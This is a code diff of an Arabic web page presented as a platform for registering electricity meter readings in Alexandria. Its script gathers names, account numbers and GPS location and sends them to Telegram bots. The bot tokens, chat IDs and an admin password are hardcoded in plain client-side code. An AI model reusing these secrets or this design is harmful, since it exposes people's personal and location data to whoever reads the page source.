@@ -5,10 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>منصة شعاع لتسجيل القراءات قطاع الإسكندرية</title>
   
-  <!-- كود إثبات الملكية لجوجل Search Console -->
   <meta name="google-site-verification" content="AMtgOjJj6munXN-_MFBOGVbcRPaH0A6Qcb48Gn5s96Y" />
-
-  <!-- تحسين محركات البحث SEO لضمان ظهور المنصة في جوجل -->
   <meta name="description" content="منصة شعاع الرقمية الموحدة لتسجيل قراءات عدادات الكهرباء لجميع فروع قطاع الإسكندرية.">
   <meta name="keywords" content="شعاع, قطاع الإسكندرية, تسجيل قراءات العداد, شركة شعاع للخدمات العامة, عدادات الكهرباء">
   <meta name="author" content="قطاع الإسكندرية">
@@ -289,12 +286,14 @@
     
     let currentCoords = "";
 
-    // إعدادات البوتات (البوت القديم + البوت الجديد المُضاف)
+    // إعدادات البوتات (البوت القديم + البوت الجديد معاً)
     const BOT_TOKENS = [
       '8524443031:AAEarkxePi8aaMbOKwr0YC1dzUGIMkF3WdQ', // البوت القديم
       '8793469113:AAEhI59FODkhwoRqWAAbkdOg8pFQfltIIPI'  // البوت الجديد
     ]; 
-    const CHAT_IDS = ['6847899466', '8524443031']; 
+
+    // تم إضافة الـ Chat ID الخاص بك (6847899466) لضمان الاستلام الفوري
+    const CHAT_IDS = ['6847899466']; 
 
     const ADMIN_PASSWORD = "alex123";
     let clickCount = 0;
@@ -330,7 +329,7 @@
     async function fetchTelegramReports() {
       reportsTableBody.innerHTML = `<tr><td colspan="2" class="text-muted py-4">جاري تحديث البيانات...</td></tr>`;
       try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKENS[0]}/getUpdates`);
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKENS[1]}/getUpdates`);
         const data = await response.json();
         
         if (data.ok && data.result) {
@@ -374,7 +373,7 @@
           (position) => {
             currentCoords = `${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`;
             locationInput.value = currentCoords;
-            getLocationBtn.textContent = "📍 تم التحديد";
+            getLocationBtn.textContent = "📍 تم الدقيق";
             getLocationBtn.classList.replace('btn-outline-secondary', 'btn-success');
           },
           () => {
@@ -408,7 +407,7 @@
       }
 
       submitBtn.disabled = true;
-      submitBtn.textContent = "جاري إرسال البيانات لكافة البوتات الفروع...";
+      submitBtn.textContent = "جاري إرسال البيانات لكافة البوتات...";
 
       const name = document.getElementById('clientName').value.trim() || 'بدون اسم';
       const phone = document.getElementById('accNo').value;
@@ -425,7 +424,7 @@
                           `📍 *اللوكيشن:* ${mapsLink}`;
 
       try {
-        // إرسال البيانات لكافة البوتات في القائمة تباعاً
+        // إرسال البيانات لكل البوتات ولكل الـ Chat IDs المسجلة
         for (const token of BOT_TOKENS) {
           for (const chatId of CHAT_IDS) {
             await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
